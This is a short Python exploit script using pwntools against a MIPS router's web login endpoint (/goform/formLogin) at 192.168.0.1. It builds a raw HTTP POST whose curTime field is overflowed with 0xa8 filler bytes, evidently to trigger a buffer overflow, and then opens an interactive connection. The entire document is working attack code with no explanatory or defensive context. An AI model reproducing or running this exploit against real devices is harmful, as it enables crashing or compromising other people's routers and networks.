#!/usr/bin/python3
from pwn import *

context.arch = 'mips'
context.endian = 'big'

#con = remote('127.0.0.1', 80)
con = remote('192.168.0.1', 80)


payload = b"POST /goform/formLogin HTTP/1.1\r\n"
payload += b"Host: 192.168.0.1\r\n"
payload += b"Content-Length: 253\r\n"
payload += b"Content-Type: application/x-www-form-urlencoded\r\n"
payload += b"Accept-Encoding: gzip, deflate\r\n"
payload += b"Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6\r\n"
payload += b"\r\n"

payload += b"login_name=&curTime=" + b"a"*0xa8
payload += b"&FILECODE=&VERIFICATION_CODE=&login_n=admin&login_pass=&VER_CODE="

con.sendline(payload)

con.interactive()
